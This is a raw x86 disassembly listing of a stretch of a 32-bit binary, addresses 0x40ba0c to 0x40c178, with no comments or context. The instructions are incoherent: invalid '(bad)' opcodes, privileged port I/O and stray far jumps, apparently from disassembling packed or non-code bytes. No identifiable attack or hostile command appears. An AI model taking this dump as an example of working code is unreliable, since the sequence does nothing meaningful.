  40ba0c:	pop    ebx
  40ba0d:	std    
  40ba0e:	mov    cl,0x56
  40ba10:	imul   ax,WORD PTR [edx+esi*4],0xffb6
  40ba15:	add    BYTE PTR [ebp-0x70],dh
  40ba18:	les    esi,FWORD PTR [ebx+0x23c124b2]
  40ba1e:	push   cs
  40ba1f:	daa    
  40ba20:	jns    0x40ba16
  40ba22:	icebp  
  40ba23:	sar    DWORD PTR [edi+esi*8+0x42765adb],cl
  40ba2a:	lea    ebx,[ebx]
  40ba2c:	and    DWORD PTR [esi+0x422d0313],esi
  40ba32:	inc    ebx
  40ba33:	xchg   BYTE PTR [ecx-0x778bc5e3],ah
  40ba39:	jg     0x40ba34
  40ba3b:	dec    edi
  40ba3c:	aas    
  40ba3d:	int3   
  40ba3e:	int3   
  40ba3f:	hlt    
  40ba40:	addr16 clc 
  40ba42:	(bad)  
  40ba43:	mov    edi,0xb47e9176
  40ba48:	dec    eax
  40ba49:	push   esi
  40ba4a:	jp     0x40bab6
  40ba4c:	jnp    0x40b9ce
  40ba4e:	xchg   ebx,eax
  40ba4f:	in     eax,0x27
  40ba51:	test   esi,edi
  40ba53:	add    al,BYTE PTR [ebx-0x2211f1f4]
  40ba59:	loop   0x40ba0a
  40ba5b:	jle    0x40ba51
  40ba5d:	and    BYTE PTR [ebx-0x4d],dh
  40ba60:	xchg   ebx,eax
  40ba61:	xchg   esi,eax
  40ba62:	lock scas eax,DWORD PTR es:[edi]
  40ba64:	lds    ebx,FWORD PTR [eax-0x23]
  40ba67:	in     eax,dx
  40ba68:	out    0x37,al
  40ba6a:	dec    ecx
  40ba6b:	adc    al,dh
  40ba6d:	mov    edi,0x7cdab569
  40ba73:	out    0xb3,al
  40ba75:	(bad)  
  40ba76:	mov    bl,0xb6
  40ba78:	push   ebp
  40ba79:	popa   
  40ba7a:	iret   
  40ba7b:	fdivr  QWORD PTR [esi]
  40ba7d:	dec    edx
  40ba7e:	xchg   ebp,eax
  40ba7f:	xor    DWORD PTR [edx-0x5ffd5660],eax
  40ba85:	mov    WORD PTR [ebx],ss
  40ba87:	inc    edx
  40ba88:	mov    WORD PTR [esi],?
  40ba8a:	out    0x88,al
  40ba8c:	pop    ss
  40ba8d:	mov    al,ds:0xa120e9b0
  40ba92:	adc    DWORD PTR [edi+ebx*4-0x7b],edx
  40ba96:	dec    BYTE PTR [ecx-0x3a]
  40ba99:	add    al,0xe0
  40ba9b:	fadd   DWORD PTR [esi-0x30]
  40ba9e:	out    dx,eax
  40ba9f:	out    dx,al
  40baa0:	dec    eax
  40baa1:	sti    
  40baa2:	imul   ebx,ebp,0xffffffd8
  40baa5:	xor    bl,bh
  40baa7:	xor    al,0x4
  40baa9:	pop    eax
  40baaa:	adc    al,BYTE PTR [esi+0x10]
  40baad:	xchg   DWORD PTR ds:0x28352e0e,edi
  40bab3:	xchg   edi,eax
  40bab4:	dec    ebx
  40bab5:	dec    eax
  40bab6:	fstp   DWORD PTR [edi]
  40bab8:	jmp    0x86137ad4
  40babd:	mov    cl,0x89
  40babf:	in     al,0xda
  40bac1:	fimul  DWORD PTR [esi+0x6f]
  40bac4:	clc    
  40bac5:	lea    ebp,[ebx+edi*4+0x41]
  40bac9:	add    BYTE PTR [ecx],al
  40bacb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bacc:	xor    BYTE PTR [ebp+esi*2+0x74],dl
  40bad0:	ds push ecx
  40bad2:	test   eax,eax
  40bad4:	cbw    
  40bad6:	aad    0x7f
  40bad8:	sbb    DWORD PTR [esi+edx*2-0x60],esp
  40badc:	sub    ebx,DWORD PTR [esi+0x6f]
  40badf:	rcl    BYTE PTR [ebx*4+0x1bfed3bb],1
  40bae6:	fstp   DWORD PTR [esi-0x4c]
  40bae9:	das    
  40baea:	mov    DWORD PTR [ebx+0x35],esp
  40baed:	jmp    0x40bb1e
  40baef:	or     BYTE PTR [ecx+eiz*2+0xf],dl
  40baf3:	cdq    
  40baf4:	xchg   BYTE PTR [edi-0x151f6106],ah
  40bafa:	pop    edx
  40bafb:	add    dh,BYTE PTR [edx+0x5a56064c]
  40bb01:	mov    ds:0xe4da5694,al
  40bb06:	and    eax,0x5a229288
  40bb0b:	or     bl,BYTE PTR [edx+0x2e339375]
  40bb11:	dec    edx
  40bb12:	adc    ebp,DWORD PTR [eax+0x44]
  40bb15:	pop    edx
  40bb16:	retf   0x7f09
  40bb19:	xchg   edx,eax
  40bb1a:	scas   eax,DWORD PTR es:[edi]
  40bb1b:	ds mov esi,0xf2fd2fcd
  40bb21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb22:	imul   esi,DWORD PTR [ebp+0x172a16da],0x6a76da19
  40bb2c:	scas   al,BYTE PTR es:[edi]
  40bb2d:	add    al,0x8e
  40bb2f:	mov    ds:0xcfbf7e88,al
  40bb34:	fcomp  st(0)
  40bb36:	sbb    BYTE PTR [edi],bh
  40bb38:	hlt    
  40bb39:	mov    bh,0xdf
  40bb3b:	(bad)  
  40bb3c:	(bad)  
  40bb3e:	ror    DWORD PTR [ecx],0x1a
  40bb41:	in     eax,0xf3
  40bb43:	and    BYTE PTR [ebx+0x4d],ah
  40bb46:	hlt    
  40bb47:	inc    esi
  40bb48:	repnz mov ds:0x97f4add6,eax
  40bb4e:	jp     0x40bb0f
  40bb50:	mov    dl,0x63
  40bb52:	xor    al,0x6b
  40bb54:	sbb    eax,0x153de3be
  40bb59:	push   ds
  40bb5a:	mov    eax,0x724ad17f
  40bb5f:	mov    bh,0x90
  40bb61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb62:	sub    ebp,ecx
  40bb64:	fnstsw WORD PTR [ebp+0x2e]
  40bb67:	inc    edx
  40bb68:	mov    BYTE PTR [edx-0x73468d78],ah
  40bb6e:	out    dx,eax
  40bb6f:	sti    
  40bb70:	cmp    al,0xf2
  40bb72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb73:	daa    
  40bb74:	js     0x40bb6c
  40bb76:	call   0x443248a5
  40bb7b:	xchg   esp,eax
  40bb7c:	stos   DWORD PTR es:[edi],eax
  40bb7d:	push   ebx
  40bb7e:	xchg   esp,eax
  40bb7f:	sub    edx,DWORD PTR [ebx]
  40bb81:	mov    al,BYTE PTR [ecx]
  40bb83:	push   0xffffffa9
  40bb85:	sbb    eax,edi
  40bb87:	push   edx
  40bb88:	test   DWORD PTR [edi+0x252bb0ae],0xb1d29691
  40bb92:	out    dx,al
  40bb93:	push   ebx
  40bb94:	in     eax,0x6b
  40bb96:	(bad)  
  40bb97:	xchg   ecx,eax
  40bb98:	cld    
  40bb99:	dec    esi
  40bb9a:	lahf   
  40bb9b:	imul   ebp,DWORD PTR [ecx-0x64],0xffffff97
  40bb9f:	lock mov cl,0x73
  40bba2:	dec    esp
  40bba3:	adc    al,0x27
  40bba5:	jmp    0x145b:0x7a7ae63e
  40bbac:	dec    ebx
  40bbad:	cmp    eax,0x9ea4799
  40bbb2:	cmp    eax,0x32486a29
  40bbb7:	out    dx,eax
  40bbb8:	jmp    0x40bc04
  40bbba:	jnp    0x40bb65
  40bbbc:	jmp    0x40bbbf
  40bbbe:	push   0x3
  40bbc0:	pusha  
  40bbc1:	add    al,0xc8
  40bbc3:	push   cs
  40bbc4:	xchg   ebx,eax
  40bbc5:	jecxz  0x40bbc8
  40bbc7:	mov    dl,0xc0
  40bbc9:	add    eax,0x9e419a68
  40bbce:	cmp    ecx,DWORD PTR [eax]
  40bbd0:	ret    
  40bbd1:	aad    0x1b
  40bbd3:	cli    
  40bbd4:	loopne 0x40bc35
  40bbd6:	fisttp DWORD PTR [di+0x3011]
  40bbdb:	inc    ebx
  40bbdc:	mov    ebp,0xfcf3a1ea
  40bbe1:	and    ebx,DWORD PTR [edi+0x364772b4]
  40bbe7:	jge    0x40bc46
  40bbe9:	cmp    eax,0x8ddb68be
  40bbee:	sahf   
  40bbef:	push   ebx
  40bbf0:	mov    ah,0xfd
  40bbf2:	pop    edx
  40bbf3:	push   0xa2681140
  40bbf8:	push   0x1
  40bbfa:	test   al,0x8d
  40bbfc:	dec    eax
  40bbfd:	push   esp
  40bbfe:	and    eax,0x6c6c9020
  40bc03:	or     al,0x50
  40bc05:	push   ds
  40bc06:	add    BYTE PTR [ecx+0x61a2042d],dl
  40bc0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc0d:	xor    eax,0xafd15955
  40bc12:	or     BYTE PTR [ebx+0x4a],cl
  40bc15:	pop    es
  40bc16:	or     eax,0x182d14c8
  40bc1b:	adc    eax,0x1c830a55
  40bc20:	inc    eax
  40bc21:	lds    eax,FWORD PTR ds:0xf3f62078
  40bc27:	retf   
  40bc28:	mov    edi,0xe18312fe
  40bc2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc2e:	clc    
  40bc2f:	imul   edi,DWORD PTR [edi],0xfffffff8
  40bc32:	pop    ebp
  40bc33:	mov    WORD PTR [edi-0x45fda671],cs
  40bc39:	pop    esi
  40bc3a:	sub    eax,DWORD PTR [edx+0x7]
  40bc3d:	xchg   BYTE PTR [eax],cl
  40bc3f:	fwait
  40bc40:	int    0x26
  40bc42:	jg     0x40bc3f
  40bc44:	jg     0x40bcc0
  40bc46:	pop    ds
  40bc47:	(bad)  
  40bc48:	cli    
  40bc49:	and    edi,esp
  40bc4b:	aam    0xcf
  40bc4d:	popf   
  40bc4e:	mov    ds:0xfd8fdfd5,eax
  40bc53:	inc    esi
  40bc54:	test   BYTE PTR ds:0x652120dc,0xc
  40bc5b:	hlt    
  40bc5c:	cld    
  40bc5d:	cwde   
  40bc5e:	aaa    
  40bc5f:	fdivr  QWORD PTR [edi]
  40bc61:	in     al,0xe3
  40bc63:	jg     0x40bc5e
  40bc65:	jne    0x40bc7f
  40bc67:	xchg   edi,eax
  40bc68:	fisttp WORD PTR [esi+0x25]
  40bc6b:	scas   al,BYTE PTR es:[edi]
  40bc6c:	mov    esi,DWORD PTR [esi-0x2abf8c67]
  40bc72:	repnz cmp edi,esi
  40bc75:	loop   0x40bcc0
  40bc77:	ds test eax,0xa8e60871
  40bc7e:	(bad)  
  40bc7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc80:	sub    BYTE PTR [edi-0x39],dl
  40bc83:	shr    BYTE PTR [ebx],0xd9
  40bc86:	and    al,0x2c
  40bc88:	outs   dx,BYTE PTR ds:[esi]
  40bc89:	adc    ebx,edx
  40bc8b:	dec    ecx
  40bc8c:	loop   0x40bc4a
  40bc8e:	and    DWORD PTR [ecx+0x5c],ebp
  40bc91:	mov    esi,0x23693667
  40bc96:	popf   
  40bc97:	arpl   WORD PTR [eax],si
  40bc99:	xchg   esp,eax
  40bc9a:	or     al,BYTE PTR ds:0xe35a8cb8
  40bca0:	xor    DWORD PTR [edi+edx*2],edi
  40bca3:	and    BYTE PTR [ecx+0x43],bl
  40bca6:	mov    ds:0xb125523b,al
  40bcab:	sbb    ebx,DWORD PTR [ecx]
  40bcad:	call   0xa6d5e52
  40bcb2:	rcr    edi,1
  40bcb4:	pop    ss
  40bcb5:	int    0xd0
  40bcb7:	int    0x9f
  40bcb9:	sub    DWORD PTR [edi],eax
  40bcbb:	es sti 
  40bcbd:	xchg   esp,eax
  40bcbe:	std    
  40bcbf:	popa   
  40bcc0:	mov    BYTE PTR [eax],0x98
  40bcc3:	out    dx,eax
  40bcc4:	sub    ebp,DWORD PTR [ecx]
  40bcc6:	xchg   ebp,eax
  40bcc7:	or     esi,DWORD PTR [eax]
  40bcc9:	aas    
  40bcca:	jle    0x40bcc1
  40bccc:	cli    
  40bccd:	stc    
  40bcce:	xchg   ecx,eax
  40bccf:	push   cs
  40bcd0:	mov    ecx,0x46d76d05
  40bcd5:	sar    BYTE PTR [ebp+eax*1-0x2b0c2c2d],0x95
  40bcdd:	jnp    0x40bd0f
  40bcdf:	dec    ebp
  40bce0:	popaw  
  40bce2:	hlt    
  40bce3:	fs xchg ebx,eax
  40bce5:	or     ecx,esi
  40bce7:	xor    eax,0xcddbe608
  40bcec:	sbb    ch,dh
  40bcee:	jbe    0x40bcfb
  40bcf0:	sti    
  40bcf1:	ja     0x40bccd
  40bcf3:	addr16 push es
  40bcf5:	push   0x72aac71c
  40bcfa:	mov    cl,0x26
  40bcfc:	push   eax
  40bcfd:	or     DWORD PTR [esi+0x5aeaf192],esi
  40bd03:	pop    ds
  40bd04:	cmp    al,0xdf
  40bd06:	push   cs
  40bd07:	adc    ah,0x58
  40bd0a:	push   0xf703ada4
  40bd0f:	pop    ebp
  40bd10:	adc    bh,0xb
  40bd13:	shr    BYTE PTR [eax-0x2d2519f9],cl
  40bd19:	cmp    DWORD PTR [esi+0x8],edx
  40bd1c:	adc    BYTE PTR gs:[edx+ebp*2],dl
  40bd20:	mov    ds:0x84821490,al
  40bd25:	cmp    edi,eax
  40bd27:	in     eax,0xff
  40bd29:	jl     0x40bcad
  40bd2b:	lods   eax,DWORD PTR ds:[esi]
  40bd2c:	lods   eax,DWORD PTR ds:[esi]
  40bd2d:	inc    esp
  40bd2f:	pop    edi
  40bd30:	sti    
  40bd31:	ror    DWORD PTR [edi],0xb0
  40bd34:	mov    eax,0x79e780b8
  40bd39:	mov    edx,0x2dced312
  40bd3e:	das    
  40bd3f:	pop    ebp
  40bd40:	int3   
  40bd41:	and    edx,DWORD PTR ss:[ecx+0x7f2ad5ab]
  40bd48:	in     eax,dx
  40bd49:	scas   eax,DWORD PTR es:[edi]
  40bd4a:	mov    esp,0x4be54a93
  40bd4f:	cld    
  40bd50:	mov    edi,DWORD PTR [edi-0x4d]
  40bd53:	int3   
  40bd54:	jbe    0x40bd45
  40bd56:	inc    eax
  40bd57:	dec    edx
  40bd58:	dec    esp
  40bd59:	(bad)  
  40bd5a:	sub    BYTE PTR [eax-0x6f7555dc],bl
  40bd60:	data16 add bh,bl
  40bd63:	mov    bx,0xfc7c
  40bd67:	mov    ebx,0x33d99816
  40bd6c:	xchg   esi,eax
  40bd6d:	shl    edi,1
  40bd6f:	pop    ebp
  40bd70:	adc    eax,0xbadbaf20
  40bd75:	sub    eax,0x9c455449
  40bd7a:	test   eax,0xb7b629a9
  40bd7f:	pop    ebx
  40bd80:	cld    
  40bd81:	out    dx,al
  40bd82:	addr16 push ds
  40bd84:	ins    DWORD PTR es:[di],dx
  40bd86:	stos   DWORD PTR es:[edi],eax
  40bd87:	into   
  40bd88:	hlt    
  40bd89:	in     al,dx
  40bd8a:	adc    dl,BYTE PTR [ebp+0x5f8114ca]
  40bd90:	xlat   BYTE PTR ds:[ebx]
  40bd91:	mov    ecx,0xe063a414
  40bd96:	jae    0x40bdf8
  40bd98:	ja     0x40bd7c
  40bd9a:	sbb    dh,dl
  40bd9c:	int3   
  40bd9d:	mov    ebx,0x718abe41
  40bda2:	push   0x7b
  40bda4:	(bad)  
  40bda5:	push   esp
  40bda6:	fwait
  40bda7:	(bad)  
  40bda8:	adc    al,0xd4
  40bdaa:	(bad)  
  40bdab:	and    eax,0xc30c3a42
  40bdb0:	fsubr  QWORD PTR [ebx]
  40bdb2:	xchg   esp,ebp
  40bdb4:	jne    0x40bd46
  40bdb6:	(bad)  
  40bdb7:	nop
  40bdb8:	fisubr DWORD PTR [ebp+0x5e763868]
  40bdbe:	adc    eax,0x8d0836b0
  40bdc3:	adc    al,0x62
  40bdc5:	adc    eax,0x50461809
  40bdca:	cs (bad) 
  40bdcc:	int3   
  40bdcd:	into   
  40bdce:	xor    al,0x9
  40bdd0:	jne    0x40be24
  40bdd2:	xchg   esp,eax
  40bdd3:	cmp    al,0xfa
  40bdd5:	add    al,0x15
  40bdd7:	(bad)  
  40bdd8:	loope  0x40bd94
  40bdda:	add    BYTE PTR [ebp-0x748f6911],bl
  40bde0:	adc    eax,DWORD PTR [ecx+0x8537698]
  40bde6:	inc    eax
  40bde7:	push   0x9
  40bde9:	addr16 (bad) 
  40bdeb:	std    
  40bdec:	dec    ebp
  40bded:	xor    edi,DWORD PTR [edx]
  40bdef:	mov    edi,0xc046565a
  40bdf4:	push   edx
  40bdf5:	dec    ecx
  40bdf6:	stc    
  40bdf7:	aad    0x87
  40bdf9:	ret    
  40bdfa:	loope  0x40be04
  40bdfc:	icebp  
  40bdfd:	out    dx,al
  40bdfe:	inc    esp
  40bdff:	fsub   st,st(6)
  40be01:	cld    
  40be02:	fnsave [edx]
  40be04:	add    edi,esi
  40be06:	mov    esp,0xe3a2e5a2
  40be0b:	fadd   QWORD PTR [ecx-0x14]
  40be0e:	or     DWORD PTR [ecx-0x3d],esp
  40be11:	mov    esi,0xa9509265
  40be16:	push   esi
  40be17:	mov    BYTE PTR [ebx],dl
  40be19:	leave  
  40be1a:	aad    0xd5
  40be1c:	add    DWORD PTR [eax+0x4d],edi
  40be1f:	add    BYTE PTR [ecx+eiz*4],bh
  40be22:	push   edx
  40be23:	and    BYTE PTR [ecx],0x74
  40be26:	in     al,0x69
  40be28:	in     al,dx
  40be29:	jmp    0x2669:0x5c1faaf9
  40be30:	in     eax,dx
  40be31:	xchg   esp,eax
  40be32:	cmp    eax,0x8cc188d2
  40be37:	dec    edx
  40be38:	add    bh,BYTE PTR [eax+0x3e]
  40be3b:	cmp    BYTE PTR ss:[eax+0x2195e104],cl
  40be42:	cmp    ah,cl
  40be44:	outs   dx,DWORD PTR ds:[esi]
  40be45:	cld    
  40be46:	into   
  40be47:	xor    ch,BYTE PTR [edi+0x7e79fc9c]
  40be4d:	call   0x7d13b41
  40be52:	pop    esi
  40be53:	ja     0x40be74
  40be55:	xchg   ebp,eax
  40be56:	dec    edx
  40be57:	(bad)
  40be5a:	neg    BYTE PTR [ebx+0x30]
  40be5d:	mov    dl,0x9e
  40be5f:	push   DWORD PTR ds:0xb972bb46
  40be65:	int3   
  40be66:	daa    
  40be67:	ds cli 
  40be69:	push   esi
  40be6a:	xchg   edx,eax
  40be6b:	cmp    cl,ah
  40be6d:	pop    edi
  40be6e:	dec    ah
  40be70:	pop    ecx
  40be71:	pop    edx
  40be72:	std    
  40be73:	add    ebp,DWORD PTR [ecx]
  40be75:	rcr    DWORD PTR [eax],1
  40be77:	pop    ss
  40be78:	mov    al,ds:0xeaf50246
  40be7d:	xor    bh,0xbd
  40be80:	mov    ds:0xb8de5bce,eax
  40be85:	iret   
  40be86:	adc    dh,BYTE PTR [edx-0x3e645947]
  40be8c:	ss scas eax,DWORD PTR es:[edi]
  40be8e:	out    0xbb,eax
  40be90:	sub    eax,0xb56a430c
  40be95:	sbb    al,BYTE PTR [ecx+0x10]
  40be98:	lock jnp 0x40be3a
  40be9b:	stc    
  40be9c:	sub    cl,bh
  40be9e:	pop    ds
  40be9f:	(bad)  [esp+ebp*2-0x6]
  40bea3:	xor    eax,0xf8932a94
  40bea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bea9:	mov    DWORD PTR es:[edx+ecx*2],edx
  40bead:	je     0x40be59
  40beaf:	pop    DWORD PTR [edx+0x2babfab5]
  40beb5:	bound  ebp,QWORD PTR ds:0x834e76f7
  40bebb:	sub    ebx,DWORD PTR [ebp-0x5c80773]
  40bec1:	mov    ebp,0xb9c84933
  40bec6:	xchg   al,cl
  40bec8:	adc    DWORD PTR [ebx+0x7a],edi
  40becb:	pushf  
  40becc:	dec    ebx
  40becd:	cmc    
  40bece:	cmp    DWORD PTR [ecx],esp
  40bed0:	and    al,0xdc
  40bed2:	in     eax,dx
  40bed3:	in     al,0x9a
  40bed5:	popa   
  40bed6:	or     al,BYTE PTR [edx+0x1b]
  40bed9:	adc    edx,DWORD PTR [ebp-0x3516e8b6]
  40bedf:	enter  0x50e1,0x32
  40bee3:	fld1   
  40bee5:	xor    DWORD PTR [edi],edi
  40bee7:	aaa    
  40bee8:	inc    edi
  40bee9:	sbb    BYTE PTR [esi+0x2c68adc8],ah
  40beef:	mov    edx,0xfb9da753
  40bef4:	ja     0x40be77
  40bef6:	push   edi
  40bef7:	bnd ja 0x40beb7
  40befa:	adc    eax,0xa008376d
  40beff:	add    al,0x4a
  40bf01:	cli    
  40bf02:	add    eax,0x9307a041
  40bf07:	sub    DWORD PTR [edx],ebx
  40bf09:	popa   
  40bf0a:	(bad)  
  40bf0b:	jb     0x40bee3
  40bf0d:	push   ebx
  40bf0e:	jecxz  0x40beb0
  40bf10:	mov    cl,0x76
  40bf12:	mov    edx,0x8888b630
  40bf17:	mov    ebx,edx
  40bf19:	outs   dx,BYTE PTR ds:[esi]
  40bf1a:	cwde   
  40bf1b:	ror    BYTE PTR [ebp-0x8a06462],0xb5
  40bf22:	pop    edi
  40bf23:	dec    edi
  40bf24:	or     ah,BYTE PTR [ecx+0x56a98067]
  40bf2a:	scas   al,BYTE PTR es:[edi]
  40bf2b:	push   esp
  40bf2c:	push   0xb76cbab5
  40bf31:	shl    bh,cl
  40bf33:	jbe    0x40beda
  40bf35:	xchg   ecx,eax
  40bf36:	mov    al,BYTE PTR [ecx]
  40bf38:	jo     0x40bf5f
  40bf3a:	cmp    eax,0xecc8199a
  40bf3f:	mov    edx,0x4301d574
  40bf44:	sub    al,0xe
  40bf46:	pop    edx
  40bf47:	mov    BYTE PTR [ebx],dl
  40bf49:	lea    edi,[edx]
  40bf4b:	xor    al,0x12
  40bf4d:	dec    eax
  40bf4e:	shl    BYTE PTR [ebx-0x3bc5a07e],0x57
  40bf55:	push   ds
  40bf56:	cmp    ecx,edi
  40bf58:	repnz (bad) 
  40bf5b:	adc    eax,0xde87f87e
  40bf60:	retf   
  40bf61:	mov    ebx,0x5b16fddf
  40bf66:	jns    0x40bf91
  40bf68:	call   FWORD PTR [esi+0x36fce5f9]
  40bf6e:	xor    DWORD PTR [esi+eax*1-0x7d],0x1
  40bf73:	inc    ecx
  40bf74:	adc    al,dh
  40bf76:	jge    0x40bf97
  40bf78:	jg     0x40bf95
  40bf7a:	xchg   edx,eax
  40bf7b:	das    
  40bf7c:	icebp  
  40bf7d:	das    
  40bf7e:	dec    ch
  40bf80:	pop    ecx
  40bf81:	cmp    al,bl
  40bf83:	add    ebx,eax
  40bf85:	mov    al,ds:0x3cd92d20
  40bf8a:	adc    DWORD PTR [ecx-0x9],esi
  40bf8d:	shl    DWORD PTR [esi],0x7f
  40bf90:	in     eax,0x63
  40bf92:	not    DWORD PTR [ecx-0x57]
  40bf95:	xchg   esp,eax
  40bf96:	ins    BYTE PTR es:[edi],dx
  40bf97:	dec    esi
  40bf98:	mov    ebx,0x4eca9b22
  40bf9d:	jbe    0x40bfb5
  40bf9f:	ret    
  40bfa0:	and    al,0x26
  40bfa2:	daa    
  40bfa3:	daa    
  40bfa4:	cmp    edx,edi
  40bfa6:	ret    0x3e09
  40bfa9:	test   DWORD PTR [ebp+0x3cfe9097],0x4a1eeae5
  40bfb3:	xchg   ebp,eax
  40bfb4:	jno    0x40bfc6
  40bfb6:	sbb    DWORD PTR [esi+0x54fa68f9],0xa5a78813
  40bfc0:	xor    al,0x9e
  40bfc2:	dec    ebx
  40bfc3:	mov    dl,0x39
  40bfc5:	jecxz  0x40bf65
  40bfc7:	xchg   dh,ch
  40bfc9:	test   eax,0x88846258
  40bfce:	in     eax,dx
  40bfcf:	jno    0x40c03f
  40bfd1:	lods   al,BYTE PTR ds:[esi]
  40bfd2:	inc    eax
  40bfd3:	cli    
  40bfd4:	or     eax,0x2679784
  40bfd9:	jns    0x40bf8f
  40bfdb:	loope  0x40bfed
  40bfdd:	ins    BYTE PTR es:[edi],dx
  40bfde:	out    0x30,al
  40bfe0:	imul   edi,DWORD PTR [edi+0x25],0xd8e14b10
  40bfe7:	daa    
  40bfe8:	add    al,0x32
  40bfea:	xchg   ecx,eax
  40bfeb:	xchg   esp,eax
  40bfec:	std    
  40bfed:	push   cs
  40bfee:	sahf   
  40bfef:	xchg   edi,eax
  40bff0:	stos   BYTE PTR es:[edi],al
  40bff1:	pusha  
  40bff2:	cmp    ecx,DWORD PTR [ebp-0x294dc32f]
  40bff8:	ins    DWORD PTR es:[edi],dx
  40bff9:	xchg   ebp,eax
  40bffa:	fnsetpm(287 only) 
  40bffc:	push   es
  40bffd:	fmul   QWORD PTR ds:0xc31ba802
  40c003:	pop    eax
  40c004:	mov    ecx,0x6603d26c
  40c009:	adc    DWORD PTR [esp+edx*2-0x58],0x6f
  40c00e:	add    DWORD PTR ss:[esi+eax*2-0x45],esp
  40c013:	sub    al,BYTE PTR [eax-0x280499bf]
  40c019:	arpl   cx,bx
  40c01b:	mov    edi,0x16bfc49e
  40c020:	adc    eax,eax
  40c022:	call   0x5784eecf
  40c027:	cmp    ebp,DWORD PTR [ecx+0x3d9ccb94]
  40c02d:	ja     0x40bfb0
  40c02f:	outs   dx,BYTE PTR ds:[esi]
  40c030:	daa    
  40c031:	mov    cl,0x28
  40c033:	fnstenv [ebx]
  40c035:	inc    edx
  40c036:	enter  0x6140,0x99
  40c03a:	pop    esi
  40c03b:	retf   
  40c03c:	or     BYTE PTR [ebx+ebp*1],ah
  40c03f:	fnstenv [ecx-0x77]
  40c042:	(bad)  
  40c043:	(bad)  
  40c045:	mov    al,ds:0x229b7485
  40c04a:	jg     0x40c05b
  40c04c:	jmp    0x78d19a75
  40c051:	js     0x40c015
  40c053:	daa    
  40c054:	test   al,0xec
  40c056:	in     eax,0xa5
  40c058:	push   ebx
  40c059:	and    eax,0xfc8ffefe
  40c05e:	and    DWORD PTR [edi-0x9],edi
  40c061:	loop   0x40c08d
  40c063:	pop    ds
  40c064:	stc    
  40c065:	lock jnp 0x40c0d1
  40c068:	xor    al,0xea
  40c06a:	test   BYTE PTR [ecx+0x38],ah
  40c06d:	push   edx
  40c06e:	ins    BYTE PTR es:[edi],dx
  40c06f:	jb     0x40c098
  40c071:	fs nop
  40c073:	daa    
  40c074:	dec    edx
  40c075:	add    DWORD PTR [esi+edi*4],0xffffffff
  40c079:	jecxz  0x40c0ea
  40c07b:	mov    ds:0x7e63ffdf,eax
  40c080:	jmp    0xc7ee:0x17a79fdf
  40c087:	out    0x15,al
  40c089:	adc    BYTE PTR [edx+0x1f3ea999],al
  40c08f:	std    
  40c090:	rcr    BYTE PTR [ebx+edi*2],1
  40c093:	out    0x9b,eax
  40c095:	xchg   esi,eax
  40c096:	loope  0x40c0ac
  40c098:	adc    DWORD PTR [esp+ecx*4],edi
  40c09b:	jmp    0xcc86:0x185f66fd
  40c0a2:	into   
  40c0a3:	into   
  40c0a4:	mov    dl,0xb5
  40c0a6:	fucom  st(6)
  40c0a8:	push   ebx
  40c0a9:	mov    edi,0xd79728f3
  40c0ae:	stos   BYTE PTR es:[edi],al
  40c0af:	int3   
  40c0b0:	cs in  al,dx
  40c0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0b3:	push   esp
  40c0b4:	push   ds
  40c0b5:	and    ecx,DWORD PTR [eax]
  40c0b7:	stos   BYTE PTR es:[edi],al
  40c0b8:	and    al,0x89
  40c0ba:	les    eax,FWORD PTR [esi]
  40c0bc:	out    0x48,al
  40c0be:	xor    edx,DWORD PTR [esi+0x54]
  40c0c1:	pop    es
  40c0c2:	test   eax,0xba773e88
  40c0c7:	mov    dl,0xea
  40c0c9:	mov    ds:0xfd3f5e4c,eax
  40c0ce:	sub    eax,0xb893b432
  40c0d3:	stos   BYTE PTR es:[edi],al
  40c0d4:	add    al,0xd9
  40c0d6:	arpl   bp,cx
  40c0d8:	cmp    BYTE PTR ds:0x41813216,0x7a
  40c0df:	fs pushw ss
  40c0e2:	sbb    eax,0xd597a828
  40c0e7:	dec    ebp
  40c0e9:	js     0x40c13d
  40c0eb:	jg     0x40c0c3
  40c0ed:	dec    eax
  40c0ee:	cwde   
  40c0ef:	dec    eax
  40c0f0:	in     eax,0xa
  40c0f2:	dec    esp
  40c0f3:	inc    edx
  40c0f4:	(bad)  
  40c0f5:	sbb    ah,BYTE PTR [ecx]
  40c0f7:	add    ah,0x86
  40c0fa:	xor    edx,DWORD PTR [edi]
  40c0fc:	(bad)  [ebx-0x24]
  40c0ff:	inc    edx
  40c100:	cmp    bh,BYTE PTR [ecx-0x1be7e98a]
  40c106:	aaa    
  40c107:	fimul  WORD PTR [edx-0x7fe4d44a]
  40c10d:	jmp    0x40c10d
  40c10f:	xor    dl,BYTE PTR [eax]
  40c111:	fbld   TBYTE PTR ds:0xf77efcf4
  40c117:	cmp    al,0xb7
  40c119:	pop    ebp
  40c11a:	dec    ebx
  40c11b:	jp     0x40c0fc
  40c11d:	test   al,0x3e
  40c11f:	pop    edi
  40c120:	aam    0x6e
  40c122:	xchg   esp,eax
  40c123:	imul   esp,DWORD PTR [esi+ebx*4+0xf],0x94ac4b52
  40c12b:	push   ss
  40c12c:	add    eax,0xcd1abaf8
  40c131:	mov    ecx,0x76e91773
  40c136:	adc    esi,eax
  40c138:	inc    esp
  40c139:	es out dx,eax
  40c13b:	xchg   BYTE PTR [edx-0x69],dl
  40c13e:	mov    ch,0x51
  40c140:	retf   0x7348
  40c143:	test   eax,0x7a48d988
  40c148:	mov    bl,0xcd
  40c14a:	xor    BYTE PTR [ebp-0x4d0aaf6c],dl
  40c150:	je     0x40c123
  40c152:	inc    ebx
  40c153:	adc    ah,0x45
  40c156:	inc    esp
  40c157:	ins    DWORD PTR es:[edi],dx
  40c158:	loop   0x40c16a
  40c15a:	cmp    al,0x2
  40c15c:	aas    
  40c15d:	mov    al,ds:0xeae69e5c
  40c162:	mov    WORD PTR [edi],bx
  40c165:	std    
  40c166:	icebp  
  40c167:	daa    
  40c168:	cmp    BYTE PTR [edi+0x7e],bh
  40c16b:	cmp    DWORD PTR [edi-0x74414803],0xffffffe9
  40c172:	test   eax,0xf23cccc9
  40c177:	popf   
  40c178:	mov    al,ds:0xe637dbbf
